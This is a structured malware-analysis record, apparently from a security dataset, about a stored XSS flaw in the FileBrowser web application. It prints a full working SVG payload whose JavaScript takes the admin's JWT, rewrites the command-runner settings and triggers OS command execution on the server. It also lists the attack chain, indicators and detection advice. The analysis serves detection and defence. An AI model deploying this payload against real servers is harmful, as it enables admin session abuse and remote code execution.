package_info.package_manager: standalone (not a package manager, but a web application)
package_info.why_malicious: A stored XSS vulnerability allows authenticated users to upload malicious SVG files that, when viewed by an administrator, execute arbitrary JavaScript. This JavaScript abuses FileBrowser's command runner feature to achieve remote code execution (RCE) on the server, enabling attackers to run arbitrary OS commands with the privileges of the FileBrowser process.

malicious_snippets.code_snippet:
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">
var xhr = new XMLHttpRequest();
xhr.open("PUT", document.location['origin'] + "/api/settings", true);
xhr.setRequestHeader("Accept", "*/*");
xhr.setRequestHeader("X-Auth", localStorage['jwt']);
xhr.setRequestHeader("Accept-Language", 'en,es;q=0.5');
xhr.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");
xhr.withCredentials = true;
var body = '{"commands":{"before_upload":"touch /tmp/rce.txt"}}';
xhr.send(body);

setTimeout(() => { console.log(); }, 2000);

var xhr2 = new XMLHttpRequest();
xhr2.open("POST", document.location['origin'] + "/api/resources/" + Math.random().toString(36).substring(7) + ".html?override=true", true);
xhr2.setRequestHeader("Accept", "*/*");
xhr2.setRequestHeader("X-Auth", localStorage['jwt']);
xhr2.setRequestHeader("Content-Type", "text/html");
xhr2.withCredentials = true;
xhr2.send("abcd");
</script>
</svg>
malicious_snippets.code_behavior: When an admin previews the uploaded SVG file, the embedded JavaScript executes in the admin's browser context, sending an authenticated PUT request to the /api/settings endpoint to set a 'before_upload' command to 'touch /tmp/rce.txt', then uploads a file to trigger the command runner, resulting in the creation of /tmp/rce.txt on the server.

malice_analysis.why_suspicious: The SVG file contains embedded JavaScript that performs authenticated API requests to modify global server settings and trigger OS command execution, which is not expected from user-uploaded files.
malice_analysis.violated_expectations: Normally, uploaded SVG files should only contain static image data. Executing JavaScript from user-uploaded files and modifying server configuration via XSS is highly abnormal and dangerous.
malice_analysis.similar_legitimate_use: Legitimate SVG files may contain JavaScript for interactive graphics, but should never be able to access authentication tokens or modify server settings.
key_indicators: API requests to /api/settings with command runner payload
Triggering OS command execution via 'before_upload' setting

attack_chain.action: Attacker uploads a malicious SVG file containing JavaScript XSS payload.
attack_chain.leads_to: Payload is stored on the server and awaits admin interaction.

attack_chain.action: Administrator previews or opens the malicious SVG file, triggering the embedded JavaScript in their browser context.
attack_chain.leads_to: JavaScript executes with admin's session and authentication.

attack_chain.action: JavaScript sends an authenticated PUT request to /api/settings, setting 'before_upload' to execute 'touch /tmp/rce.txt'.
attack_chain.leads_to: Server is now configured to execute arbitrary OS commands on file upload.

attack_chain.action: JavaScript uploads a file to trigger the 'before_upload' command, resulting in OS command execution on the server.

behavioral_signatures: API requests to /api/settings with 'before_upload' or other command runner parameters set to shell commands
Unexpected file creation in /tmp or other sensitive directories after file upload events
Unusual use of localStorage['jwt'] in client-side scripts
file_indicators: Files named exploit.svg or similar, uploaded by non-admin users
Presence of /tmp/rce.txt or other artifacts created by shell commands
network_indicators: PUT requests to /api/settings from browser sessions
POST requests to /api/resources/ with random filenames
Requests with authentication tokens originating from non-standard browser actions
detection_knowledge.how_to_detect: Monitor for SVG uploads containing <script> tags, especially those making API calls to /api/settings or /api/resources. Alert on any changes to command runner settings via API from browser sessions. Watch for file creation in /tmp or other sensitive locations following file uploads. Implement CSP headers to block inline scripts in SVGs and restrict file types that can be executed or previewed in the browser.
